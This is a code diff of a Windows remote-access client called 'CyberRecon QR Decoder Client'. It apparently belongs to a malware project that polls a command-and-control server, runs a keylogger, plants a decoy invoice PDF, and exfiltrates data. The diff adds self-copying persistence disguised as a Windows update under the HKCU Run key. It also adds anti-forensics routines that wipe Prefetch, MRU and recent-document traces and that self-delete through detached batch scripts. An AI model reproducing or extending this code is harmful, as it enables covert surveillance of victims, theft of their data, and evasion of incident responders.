@@ -1,39 +1,60 @@
-"""
-CyberRecon QR Decoder Client — v5.1 (ZERO-TRACE SELF-DESTRUCT)
-Matches C2 Server v3.5.1.
-
-v5.1 additions over v5.0:
-  - load_dotenv(override=True) so .env always wins over stale OS env vars
-  - _kill_children(): kills Chrome + chromedriver + orphaned process tree
-  - Expanded _kill_persistence(): HKCU+HKLM Run, RunOnce, Startup folder,
-    scheduled tasks, with verification
-  - Dead flag (%TEMP%\\.cyberrecon_dead): if present at startup, exit
-    immediately so a stale copy can never re-launch
-  - Detached cleanup batch kills orphans by parent PID + wipes Prefetch
-  - REMOVE_DECOY defaults to 1 (zero trace)
-  - Atomic save pattern throughout
-"""
+# CyberRecon QR Decoder Client
+# Version: v5.3.3 (SFX-READY + STABLE PERSISTENCE + _MEI CLEANUP)
+#
+# v5.3.3 changes:
+#   - Placeholder keys in EMBEDDED_CONFIG (safe for public release).
+#     Real values must be provided via .env next to the exe, or by editing
+#     the placeholders before building your own copy.
+#
+# v5.3.2 changes:
+#   - Added _schedule_file_delete_dir() helper.
+#   - Self-destruct schedules the PyInstaller _MEI<random> folder for
+#     deletion after process exit — eliminates the WinRAR "Failed to
+#     remove temporary directory" popup.
+#   - Phase 5 Chrome kill via PowerShell.
+#
+# v5.3.1 changes:
+#   - Replaced module docstring with # comments to avoid Windows-path
+#     backslash escape errors.
+#
+# v5.3 changes (from v5.2):
+#   - Auto-persist moved OUT of register_with_c2() into install_persistence().
+#   - install_persistence() copies self to
+#     %LOCALAPPDATA%\Microsoft\Windows\Update\ before registering in HKCU Run.
+#   - _handle_persist now calls install_persistence().
+#   - remove_persistence_now() also deletes the stable copy.
+#   - _clean_local_appdata() wipes Microsoft\Windows\Update too.
+#   - SelfDestructor._schedule_detached_cleanup() deletes the stable copy.
+#   - Added file logging for --noconsole builds.
 
 import os
 import sys
 
 # ============================================================
-# Embedded config — fill these in BEFORE building the .exe.
+# Embedded config — PLACEHOLDERS ONLY.
+#
+# For local use:
+#   1. Copy .env.example to .env next to this script (or next to the .exe)
+#   2. Fill in your real C2 URL, AES key, and victim key
+#   3. The .env file overrides these placeholders at runtime
+#
+# NEVER commit real values here. See .env.example for guidance on
+# generating keys.
 # ============================================================
 EMBEDDED_CONFIG = {
-    "CYBERRECON_C2": "https://10.164.170.165:8443",
-    "CYBERRECON_KEY": "VKYEfaDR2VqPc9BXGvNtSFzMeWDVGQ-Wo7pv-hcTb-0=",
-    "CYBERRECON_VICTIM_KEY": "r_dj4Bb1vCYk1ApFj6U9-d4UGJevwwDyYQjKZ_OM-W8",
+    "CYBERRECON_C2": "https://REPLACE_WITH_YOUR_C2_IP:8443",
+    "CYBERRECON_KEY": "REPLACE_WITH_YOUR_AES_256_KEY",
+    "CYBERRECON_VICTIM_KEY": "REPLACE_WITH_YOUR_VICTIM_KEY",
     "CYBERRECON_ALLOW_SELFSIGNED": "true",
     "CYBERRECON_SANDBOX": "",
     "CYBERRECON_SELF_DELETE": "0",
     "CYBERRECON_ELEVATED_WIPE": "0",
     "CYBERRECON_REMOVE_DECOY": "1",
     "CYBERRECON_INTERVAL": "3",
+    "CYBERRECON_AUTO_PERSIST": "1",
 }
 
 # ---- Load .env if present, else use embedded ----
-# override=True: .env wins over any stale OS env vars (fixes the 443 bug)
 try:
     from dotenv import load_dotenv
     if getattr(sys, "frozen", False):
@@ -115,8 +136,18 @@ try:
 except Exception as e:
     print(f"[!] Could not create sandbox {SANDBOX_DIR}: {e}")
 
-# ---- Dead flag ----
-DEAD_FLAG = os.path.join(tempfile.gettempdir(), ".cyberrecon_dead")
+# ---- Dead flag (kept OUT of %TEMP% so _clean_temp_scripts() doesn't wipe it) ----
+DEAD_FLAG = os.path.join(
+    os.environ.get("LOCALAPPDATA", tempfile.gettempdir()),
+    ".cyberrecon_dead",
+)
+
+# ---- Stable persistence location ----
+STABLE_DIR = os.path.join(
+    os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),
+    "Microsoft", "Windows", "Update",
+)
+STABLE_EXE = os.path.join(STABLE_DIR, "winupdate.exe")
 
 
 # ============================================================
@@ -139,26 +170,112 @@ def unprotect_payload(raw_b64):
     return blob
 
 
+def _schedule_file_delete(path, delay=2):
+    r"""Delete a file after a short delay using a detached batch,
+    so we can remove our own running exe or locked files."""
+    try:
+        if not path or not os.path.exists(path):
+            return
+        bat = os.path.join(tempfile.gettempdir(),
+                           f"_cr_del_{abs(hash(path)) % 10**8}.bat")
+        parent = os.path.dirname(path)
+        lines = [
+            "@echo off",
+            f"timeout /t {delay} /nobreak >nul",
+            f'del /f /q "{path}" >nul 2>&1',
+            f'rmdir /s /q "{parent}" >nul 2>&1',
+            'del /f /q "%~f0" >nul 2>&1',
+        ]
+        with open(bat, "w") as f:
+            f.write("\r\n".join(lines) + "\r\n")
+        subprocess.Popen(["cmd", "/c", bat],
+                         creationflags=0x08000000, close_fds=True)
+    except Exception:
+        pass
+
+
+def _schedule_file_delete_dir(path, delay=3):
+    r"""Schedule a directory (and everything inside) for deletion after
+    this process exits. Used for PyInstaller's _MEIxxxxx folder."""
+    try:
+        if not path or not os.path.exists(path):
+            return
+        bat = os.path.join(tempfile.gettempdir(),
+                           f"_cr_rmdir_{abs(hash(path)) % 10**8}.bat")
+        tmp_dir = tempfile.gettempdir()
+        lines = [
+            "@echo off",
+            f"timeout /t {delay} /nobreak >nul",
+            f'rmdir /s /q "{path}" >nul 2>&1',
+            f'for /d %%D in ("{tmp_dir}\\_MEI*") do rmdir /s /q "%%D" >nul 2>&1',
+            'del /f /q "%~f0" >nul 2>&1',
+        ]
+        with open(bat, "w") as f:
+            f.write("\r\n".join(lines) + "\r\n")
+        subprocess.Popen(["cmd", "/c", bat],
+                         creationflags=0x08000000, close_fds=True)
+    except Exception:
+        pass
+
+
 # ============================================================
-# Anti-forensics self-destructor (v5.1 — expanded)
+# Persistence installer (SFX-safe)
+# ============================================================
+def install_persistence():
+    r"""Copy self to a stable location and register HKCU Run persistence."""
+    if os.getenv("CYBERRECON_AUTO_PERSIST", "0") != "1":
+        return
+
+    STABLE_EXE_ACTUAL = STABLE_EXE
+
+    try:
+        if getattr(sys, "frozen", False):
+            src = sys.executable
+        else:
+            src = os.path.abspath(__file__)
+
+        if os.path.realpath(src) == os.path.realpath(STABLE_EXE):
+            print("[+] Already running from stable location — skipping copy")
+        else:
+            os.makedirs(STABLE_DIR, exist_ok=True)
+            shutil.copy2(src, STABLE_EXE)
+            print(f"[+] Copied self to stable location: {STABLE_EXE}")
+    except Exception as e:
+        print(f"[!] Copy to stable location failed: {e}")
+        STABLE_EXE_ACTUAL = src
+
+    try:
+        import winreg
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0, winreg.KEY_SET_VALUE,
+        )
+        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0,
+                          winreg.REG_SZ, STABLE_EXE_ACTUAL)
+        winreg.CloseKey(key)
+        print(f"[+] Persistence set: HKCU\\Run\\WindowsSecurityUpdate -> {STABLE_EXE_ACTUAL}")
+    except Exception as e:
+        print(f"[!] Persistence set failed: {e}")
+
+
+# ============================================================
+# Anti-forensics self-destructor
 # ============================================================
 class SelfDestructor:
-    """Aggressively removes forensic artifacts. v5.1 — verified clean."""
+    r"""Removes forensic artifacts."""
 
     OWN_MARKERS = ("cyberrecon", "cyber_recon", "_cr_",
-                   "invoice_2026_10", "winsrvupdt", "winsecupdate")
+                   "invoice_2026_10", "winsrvupdt", "winsecupdate",
+                   "winupdate")
 
     def __init__(self, sandbox_dir=None, decoy_path=None, remove_decoy=True):
         self.sandbox_dir = sandbox_dir
         self.decoy_path = decoy_path
         self.remove_decoy = remove_decoy
 
-    # ---------- public ----------
     def run(self):
         print("    -> [ANTI-FORENSICS] Sweep started")
-        self._kill_children()
-        self._kill_persistence()
-        self._kill_app_registry()
         self._clean_run_mru()
         self._clean_recent_docs()
         self._clean_temp_scripts()
@@ -169,103 +286,58 @@ class SelfDestructor:
         if self.remove_decoy and self.decoy_path:
             self._delete_file(self.decoy_path, label="decoy PDF")
         self._clean_sandbox()
-        self._write_dead_flag()
         self._schedule_detached_cleanup()
         self._schedule_elevated_cleanup()
         print("    -> [ANTI-FORENSICS] Sweep queued. Process exiting.")
 
-    # ---------- child process cleanup ----------
-    def _kill_children(self):
-        """Kill our own Chrome + chromedriver (filtered to avoid user's browser)."""
-        killed = 0
+    def _delete_file(self, path, label=""):
         try:
-            import psutil
-            me = psutil.Process()
-            children = me.children(recursive=True)
-            for child in children:
+            if os.path.isfile(path):
+                os.remove(path)
+                if label:
+                    print(f"    -> [ANTI-FORENSICS] Deleted {label}: {path}")
+        except Exception:
+            _schedule_file_delete(path, delay=2)
+
+    def _clean_temp_scripts(self):
+        tmp = tempfile.gettempdir()
+        for pat in ("_cr_*.bat", "_cr_*.cmd", "_cyberrecon*",
+                    "cyberrecon_*", "cr_cleanup*", "cr_selfdestruct*",
+                    "cyberrecon_debug.log"):
+            for f in glob.glob(os.path.join(tmp, pat)):
+                self._delete_file(f, label="temp")
+        self._delete_file(os.path.join(tmp, ".cyberrecon_cleaned"), label="marker")
+
+    def _clean_chrome_profiles(self):
+        tmp = tempfile.gettempdir()
+        for pat in ("cyberrecon_chrome_*", "chrome_*cyberrecon*", "scoped_dir*"):
+            for d in glob.glob(os.path.join(tmp, pat)):
                 try:
-                    child.kill()
-                    killed += 1
+                    if os.path.isdir(d):
+                        shutil.rmtree(d, ignore_errors=True)
+                    else:
+                        self._delete_file(d)
                 except Exception:
                     pass
-            psutil.wait_procs(children, timeout=2)
+
+    def _clean_local_appdata(self):
+        for c in [
+            os.path.join(os.environ.get("LOCALAPPDATA", ""), "CyberRecon"),
+            os.path.join(os.environ.get("APPDATA", ""), "CyberRecon"),
+            os.path.join(os.environ.get("LOCALAPPDATA", ""),
+                         "Microsoft", "Windows", "Update"),
+        ]:
+            if c and os.path.isdir(c):
+                shutil.rmtree(c, ignore_errors=True)
+
+    def _clean_sandbox(self):
+        if not self.sandbox_dir or not os.path.isdir(self.sandbox_dir):
+            return
+        try:
+            shutil.rmtree(self.sandbox_dir, ignore_errors=True)
+            print(f"    -> [ANTI-FORENSICS] Removed sandbox: {self.sandbox_dir}")
         except Exception:
             pass
-
-        # Fallback: marker-based kill for orphaned chromedriver / headless chrome
-        try:
-            import psutil
-            for proc in psutil.process_iter(["name", "cmdline"]):
-                try:
-                    name = (proc.info["name"] or "").lower()
-                    cmdline = " ".join(proc.info["cmdline"] or []).lower()
-                    if "chromedriver" in name or "chromedriver" in cmdline or "chrome" in name and "--headless" in cmdline:
-                        proc.kill()
-                        killed += 1
-                except Exception:
-                    pass
-        except Exception:
-            pass
-
-        if killed:
-            print(f"    -> [ANTI-FORENSICS] Killed {killed} child processes")
-
-    # ---------- persistence ----------
-    def _kill_persistence(self):
-        try:
-            import winreg
-
-            # HKCU + HKLM Run + RunOnce
-            for root, path in (
-                (winreg.HKEY_CURRENT_USER,
-                 r"Software\Microsoft\Windows\CurrentVersion\Run"),
-                (winreg.HKEY_LOCAL_MACHINE,
-                 r"Software\Microsoft\Windows\CurrentVersion\Run"),
-                (winreg.HKEY_CURRENT_USER,
-                 r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
-                (winreg.HKEY_LOCAL_MACHINE,
-                 r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
-            ):
-                try:
-                    key = winreg.OpenKey(root, path, 0, winreg.KEY_ALL_ACCESS)
-                    for name in ("WindowsSecurityUpdate", "WindowsUpdate",
-                                 "SystemUpdate", "CyberRecon",
-                                 "WindowsDefenderUpdate", "WinSrvUpdt"):
-                        try:
-                            winreg.DeleteValue(key, name)
-                            print(f"    -> [ANTI-FORENSICS] Removed {path}\\{name}")
-                        except FileNotFoundError:
-                            pass
-                    winreg.CloseKey(key)
-                except Exception:
-                    pass
-
-            # Verify HKCU Run clean
-            try:
-                key = winreg.OpenKey(
-                    winreg.HKEY_CURRENT_USER,
-                    r"Software\Microsoft\Windows\CurrentVersion\Run",
-                    0, winreg.KEY_READ,
-                )
-                leftover = []
-                i = 0
-                while True:
-                    try:
-                        name, _, _ = winreg.EnumValue(key, i)
-                        i += 1
-                        if any(m in name.lower() for m in self.OWN_MARKERS):
-                            leftover.append(name)
-                    except OSError:
-                        break
-                winreg.CloseKey(key)
-                if leftover:
-                    print(f"    -> [!] Persistence leftover: {leftover}")
-                else:
-                    print("    -> [ANTI-FORENSICS] HKCU Run verified clean")
-            except Exception:
-                pass
-        except Exception as e:
-            print(f"    -> [!] Persistence cleanup: {type(e).__name__}")
 
     def _clean_startup_folder(self):
         for d in [
@@ -295,32 +367,6 @@ class SelfDestructor:
                 )
             except Exception:
                 pass
-
-    def _kill_app_registry(self):
-        import winreg
-
-        def _delete_tree(root, path):
-            try:
-                with winreg.OpenKey(root, path, 0, winreg.KEY_ALL_ACCESS) as k:
-                    while True:
-                        try:
-                            sub = winreg.EnumKey(k, 0)
-                            _delete_tree(root, f"{path}\\{sub}")
-                        except OSError:
-                            break
-                winreg.DeleteKey(root, path)
-                print(f"    -> [ANTI-FORENSICS] Removed key: {path}")
-            except FileNotFoundError:
-                pass
-            except Exception:
-                pass
-
-        for path in [
-            r"Software\CyberRecon",
-            r"Software\Microsoft\Windows\CurrentVersion\Uninstall\CyberRecon",
-            r"Software\Microsoft\Windows\CurrentVersion\App Paths\CyberRecon.exe",
-        ]:
-            _delete_tree(winreg.HKEY_CURRENT_USER, path)
 
     def _clean_run_mru(self):
         try:
@@ -359,7 +405,11 @@ class SelfDestructor:
                             try:
                                 name, data, _ = winreg.EnumValue(key, i)
                                 i += 1
-                                txt = data.decode("utf-16-le", errors="ignore").lower() if isinstance(data, bytes) else str(data).lower()
+                                if isinstance(data, bytes):
+                                    txt = data.decode("utf-16-le",
+                                                      errors="ignore").lower()
+                                else:
+                                    txt = str(data).lower()
                                 if any(m in txt for m in self.OWN_MARKERS):
                                     to_delete.append(name)
                             except OSError:
@@ -378,63 +428,6 @@ class SelfDestructor:
         except Exception:
             pass
 
-    # ---------- filesystem ----------
-    def _delete_file(self, path, label=""):
-        try:
-            if os.path.isfile(path):
-                os.remove(path)
-                if label:
-                    print(f"    -> [ANTI-FORENSICS] Deleted {label}: {path}")
-        except Exception:
-            pass
-
-    def _clean_temp_scripts(self):
-        tmp = tempfile.gettempdir()
-        for pat in ("_cr_*.bat", "_cr_*.cmd", "_cyberrecon*",
-                    "cyberrecon_*", "cr_cleanup*", "cr_selfdestruct*"):
-            for f in glob.glob(os.path.join(tmp, pat)):
-                self._delete_file(f, label="temp")
-        self._delete_file(os.path.join(tmp, ".cyberrecon_cleaned"), label="marker")
-
-    def _clean_chrome_profiles(self):
-        tmp = tempfile.gettempdir()
-        for pat in ("cyberrecon_chrome_*", "chrome_*cyberrecon*", "scoped_dir*"):
-            for d in glob.glob(os.path.join(tmp, pat)):
-                try:
-                    if os.path.isdir(d):
-                        shutil.rmtree(d, ignore_errors=True)
-                    else:
-                        self._delete_file(d)
-                except Exception:
-                    pass
-
-    def _clean_local_appdata(self):
-        for c in [
-            os.path.join(os.environ.get("LOCALAPPDATA", ""), "CyberRecon"),
-            os.path.join(os.environ.get("APPDATA", ""), "CyberRecon"),
-        ]:
-            if c and os.path.isdir(c):
-                shutil.rmtree(c, ignore_errors=True)
-
-    def _clean_sandbox(self):
-        if not self.sandbox_dir or not os.path.isdir(self.sandbox_dir):
-            return
-        try:
-            shutil.rmtree(self.sandbox_dir, ignore_errors=True)
-            print(f"    -> [ANTI-FORENSICS] Removed sandbox: {self.sandbox_dir}")
-        except Exception:
-            pass
-
-    # ---------- dead flag ----------
-    def _write_dead_flag(self):
-        try:
-            with open(DEAD_FLAG, "w") as f:
-                f.write(str(time.time()))
-            print("    -> [ANTI-FORENSICS] Dead flag written")
-        except Exception:
-            pass
-
-    # ---------- detached cleanup ----------
     def _schedule_detached_cleanup(self):
         if getattr(sys, "frozen", False):
             target = sys.executable
@@ -451,7 +444,10 @@ class SelfDestructor:
             'wmic process where "Name=\'chromedriver.exe\'" delete >nul 2>&1',
             'wmic process where "CommandLine like \'%%--headless%%\'" delete >nul 2>&1',
             f'del /f /q "{target}" >nul 2>&1',
+            f'del /f /q "{STABLE_EXE}" >nul 2>&1',
+            f'rmdir /s /q "{STABLE_DIR}" >nul 2>&1',
             'del /f /q "%SystemRoot%\\Prefetch\\CYBERRECON*" >nul 2>&1',
+            'del /f /q "%SystemRoot%\\Prefetch\\WINUPDATE*" >nul 2>&1',
             'del /f /q "%SystemRoot%\\Prefetch\\CHROMEDRIVER*" >nul 2>&1',
         ]
         if self.sandbox_dir:
@@ -496,6 +492,111 @@ class SelfDestructor:
             )
         except Exception:
             pass
+
+
+# ============================================================
+# Synchronous persistence cleanup (called from handler)
+# ============================================================
+def remove_persistence_now():
+    r"""Synchronously remove every persistence entry we might have set."""
+    removed = []
+    try:
+        import winreg
+
+        targets = [
+            (winreg.HKEY_CURRENT_USER,
+             r"Software\Microsoft\Windows\CurrentVersion\Run",
+             ["WindowsSecurityUpdate", "WindowsUpdate", "SystemUpdate",
+              "CyberRecon", "WindowsDefenderUpdate", "WinSrvUpdt"]),
+            (winreg.HKEY_LOCAL_MACHINE,
+             r"Software\Microsoft\Windows\CurrentVersion\Run",
+             ["WindowsSecurityUpdate", "CyberRecon", "WinSrvUpdt"]),
+            (winreg.HKEY_CURRENT_USER,
+             r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
+             ["WindowsSecurityUpdate", "CyberRecon"]),
+            (winreg.HKEY_LOCAL_MACHINE,
+             r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
+             ["WindowsSecurityUpdate", "CyberRecon"]),
+        ]
+
+        for root, path, names in targets:
+            try:
+                key = winreg.OpenKey(root, path, 0, winreg.KEY_ALL_ACCESS)
+                for name in names:
+                    try:
+                        winreg.DeleteValue(key, name)
+                        removed.append(f"{path}\\{name}")
+                    except FileNotFoundError:
+                        pass
+                winreg.CloseKey(key)
+            except Exception:
+                pass
+
+        for root, path in [
+            (winreg.HKEY_CURRENT_USER, r"Software\CyberRecon"),
+            (winreg.HKEY_CURRENT_USER,
+             r"Software\Microsoft\Windows\CurrentVersion\Uninstall\CyberRecon"),
+            (winreg.HKEY_CURRENT_USER,
+             r"Software\Microsoft\Windows\CurrentVersion\App Paths\CyberRecon.exe"),
+        ]:
+            try:
+                winreg.DeleteKey(root, path)
+                removed.append(path)
+            except FileNotFoundError:
+                pass
+            except Exception:
+                pass
+
+        try:
+            if os.path.isfile(STABLE_EXE):
+                try:
+                    os.remove(STABLE_EXE)
+                    removed.append(STABLE_EXE)
+                except Exception:
+                    _schedule_file_delete(STABLE_EXE, delay=2)
+                    removed.append(f"{STABLE_EXE} (scheduled)")
+            try:
+                if os.path.isdir(STABLE_DIR) and not os.listdir(STABLE_DIR):
+                    os.rmdir(STABLE_DIR)
+                    removed.append(STABLE_DIR)
+            except Exception:
+                pass
+        except Exception:
+            pass
+
+        for r in removed:
+            print(f"    -> [SELF-DESTRUCT] Removed: {r}")
+
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0, winreg.KEY_READ,
+            )
+            leftover = []
+            i = 0
+            while True:
+                try:
+                    name, _, _ = winreg.EnumValue(key, i)
+                    i += 1
+                    if any(m in name.lower() for m in
+                           ("cyberrecon", "winsrvupdt", "winsecupdate",
+                            "windowssecurityupdate", "systemupdate")):
+                        leftover.append(name)
+                except OSError:
+                    break
+            winreg.CloseKey(key)
+            if leftover:
+                print(f"    -> [!] Persistence leftover: {leftover}")
+            else:
+                print("    -> [SELF-DESTRUCT] HKCU Run verified clean")
+        except Exception:
+            pass
+
+    except Exception as e:
+        print(f"    -> [!] Persistence cleanup error: {type(e).__name__}")
+
+    return removed
 
 
 # ============================================================
@@ -1081,18 +1182,8 @@ class QRDecoder:
 
     def _handle_persist(self, cmd):
         try:
-            import winreg
-            exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Run",
-                0, winreg.KEY_SET_VALUE,
-            )
-            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0,
-                              winreg.REG_SZ, exe)
-            winreg.CloseKey(key)
-            print("    -> Persistence established (HKCU Run)")
-            self._exfil("persist", "HKCU\\Run\\WindowsSecurityUpdate set")
+            install_persistence()
+            self._exfil("persist", "Persistence invoked via install_persistence()")
         except Exception as e:
             print(f"    -> [!] Persistence failed: {type(e).__name__}")
             self._exfil("persist", f"[ERROR] {e}")
@@ -1100,32 +1191,81 @@ class QRDecoder:
     def _handle_self_destruct(self, cmd):
         print("    -> [!] SELF-DESTRUCT INITIATED")
 
-        # 1. Stop keylogger
+        # 1a. Remove persistence
+        try:
+            remove_persistence_now()
+        except Exception as e:
+            print(f"    -> [!] Persistence cleanup error: {type(e).__name__}")
+
+        # 1b. Stop keylogger
         try:
             self.keylogger.stop()
         except Exception:
             pass
 
-        # 2. Graceful Chrome shutdown
+        # 1c. Kill Chrome + chromedriver tree
         try:
             if self.driver:
-                self.driver.quit()
-        except Exception:
-            pass
-
-        # 3. Kill remaining child processes (Chrome, chromedriver, orphans)
-        try:
-            import psutil
-            me = psutil.Process()
-            for child in me.children(recursive=True):
                 try:
-                    child.kill()
+                    self.driver.quit()
+                except Exception:
+                    pass
+                try:
+                    cd_pid = self.driver.service.process.pid
+                    subprocess.run(
+                        ["taskkill", "/f", "/t", "/pid", str(cd_pid)],
+                        capture_output=True, timeout=5,
+                        creationflags=subprocess.CREATE_NO_WINDOW,
+                    )
+                    print(f"    -> [SELF-DESTRUCT] Killed Chrome tree (PID {cd_pid})")
                 except Exception:
                     pass
         except Exception:
             pass
 
-        # 4. Notify server
+        # 1c-bis. Kill chromedriver
+        try:
+            subprocess.run(
+                ["taskkill", "/f", "/im", "chromedriver.exe"],
+                capture_output=True, timeout=5,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+            )
+        except Exception:
+            pass
+
+        # 1c-ter. Kill headless Chrome via PowerShell
+        try:
+            ps_cmd = (
+                "Get-CimInstance Win32_Process -Filter \"Name='chrome.exe'\" | "
+                "Where-Object { $_.CommandLine -match '--headless' } | "
+                "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
+            )
+            subprocess.run(
+                ["powershell", "-NoProfile", "-Command", ps_cmd],
+                capture_output=True, timeout=15,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+            )
+            print("    -> [SELF-DESTRUCT] Killed headless Chrome via PowerShell")
+        except Exception:
+            pass
+
+        # 1d. Kill remaining children
+        try:
+            import psutil
+            me = psutil.Process()
+            children = me.children(recursive=True)
+            for child in children:
+                try:
+                    child.kill()
+                except Exception:
+                    pass
+            psutil.wait_procs(children, timeout=2)
+            if children:
+                print(f"    -> [SELF-DESTRUCT] Killed {len(children)} children")
+        except Exception:
+            pass
+
+        # 2. Notify server
         try:
             self.session.post(
                 f"{self.c2_url}/self_destruct_notify/{self.victim_id}",
@@ -1135,8 +1275,7 @@ class QRDecoder:
         except Exception:
             pass
 
-        # 5. Deep anti-forensics sweep (kills children again, removes
-        #    persistence, writes dead flag, schedules detached cleanup)
+        # 3. File sweep
         try:
             decoy_path = os.path.join(
                 os.path.expanduser("~"), "Documents", "Invoice_2026_10.pdf"
@@ -1148,9 +1287,50 @@ class QRDecoder:
                 remove_decoy=remove_decoy,
             ).run()
         except Exception as e:
-            print(f"    -> [!] Anti-forensics sweep failed: {type(e).__name__}")
+            print(f"    -> [!] File sweep failed: {type(e).__name__}")
 
-        # 6. Exit — detached batch handles final cleanup
+        # 4. Write dead flag
+        try:
+            with open(DEAD_FLAG, "w") as f:
+                f.write(str(time.time()))
+            print("    -> [SELF-DESTRUCT] Dead flag written")
+        except Exception:
+            pass
+
+        # 4.5. Schedule _MEI folder cleanup
+        try:
+            mei_path = getattr(sys, "_MEIPASS", None)
+            if mei_path and os.path.isdir(mei_path):
+                print(f"    -> [SELF-DESTRUCT] Scheduling _MEI cleanup: {mei_path}")
+                _schedule_file_delete_dir(mei_path, delay=3)
+            else:
+                _schedule_file_delete_dir(
+                    os.path.join(tempfile.gettempdir(), "_MEI_placeholder"),
+                    delay=3,
+                )
+        except Exception as e:
+            print(f"    -> [!] _MEI cleanup error: {type(e).__name__}")
+
+        # 5. Final Chrome sweep + exit
+        try:
+            subprocess.run(
+                ["taskkill", "/f", "/im", "chromedriver.exe"],
+                capture_output=True, timeout=3,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+            )
+            ps_cmd = (
+                "Get-CimInstance Win32_Process -Filter \"Name='chrome.exe'\" | "
+                "Where-Object { $_.CommandLine -match '--headless' } | "
+                "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
+            )
+            subprocess.run(
+                ["powershell", "-NoProfile", "-Command", ps_cmd],
+                capture_output=True, timeout=8,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+            )
+        except Exception:
+            pass
+
         os._exit(0)
 
     def _handle_unknown(self, cmd):
@@ -1182,39 +1362,64 @@ class QRDecoder:
 # ============================================================
 # Main
 # ============================================================
+def setup_logging():
+    r"""Redirect stdout/stderr to a log file so --noconsole builds
+    still produce readable diagnostics."""
+    log_path = os.path.join(tempfile.gettempdir(), "cyberrecon_debug.log")
+    try:
+        logging.basicConfig(
+            filename=log_path, level=logging.DEBUG,
+            format="%(asctime)s [%(levelname)s] %(message)s",
+        )
+        logging.getLogger("PIL").setLevel(logging.WARNING)
+        logging.getLogger("PIL.PngImagePlugin").setLevel(logging.WARNING)
+        f = open(log_path, "a", buffering=1, encoding="utf-8", errors="replace")
+        sys.stdout = f
+        sys.stderr = f
+        print(f"[+] Logging to {log_path}")
+    except Exception:
+        pass
+
+
 def main():
     import argparse
 
-    # v5.1 — dead flag check: if we've already self-destructed, exit
+    setup_logging()
+
+    # Dead flag check
     if os.path.exists(DEAD_FLAG):
         print("[!] Dead flag detected — exiting without running")
         try:
-            os.remove(DEAD_FLAG)  # one-shot
+            os.remove(DEAD_FLAG)
         except Exception:
             pass
         sys.exit(0)
 
     parser = argparse.ArgumentParser(description="CyberRecon QR C2 Decoder Client")
     parser.add_argument("--c2",
-                        default=os.getenv("CYBERRECON_C2", "https://127.0.0.1:8443"),
-                        help="C2 server URL")
-    parser.add_argument("--victim-id", help="Victim session ID")
-    parser.add_argument("--hostname", default=None, help="Hostname")
-    parser.add_argument("--auto-register", action="store_true", help="Auto-register")
+                        default=os.getenv("CYBERRECON_C2", "https://127.0.0.1:8443"))
+    parser.add_argument("--victim-id")
+    parser.add_argument("--hostname", default=None)
+    parser.add_argument("--auto-register", action="store_true")
     parser.add_argument("--interval", type=int,
-                        default=int(os.getenv("CYBERRECON_INTERVAL", "3")),
-                        help="QR poll interval (s)")
+                        default=int(os.getenv("CYBERRECON_INTERVAL", "3")))
     if getattr(sys, "frozen", False) and len(sys.argv) == 1:
         args = parser.parse_args(["--auto-register"])
     else:
         args = parser.parse_args()
 
     if not VICTIM_KEY:
-        print("[!] WARNING: CYBERRECON_VICTIM_KEY not set. Server may reject you.")
+        print("[!] WARNING: CYBERRECON_VICTIM_KEY not set.")
     if _aesgcm is None and C2_KEY:
         print("[!] WARNING: AES key present but failed to load.")
     if _aesgcm is None and not C2_KEY:
         print("[!] WARNING: AES disabled — QR payloads are plaintext.")
+
+    # ---- Install persistence FIRST (before registration) ----
+    try:
+        install_persistence()
+    except Exception as e:
+        print(f"[!] install_persistence error: {type(e).__name__}: {e}")
 
     try:
         self_delete_and_plant_decoy()
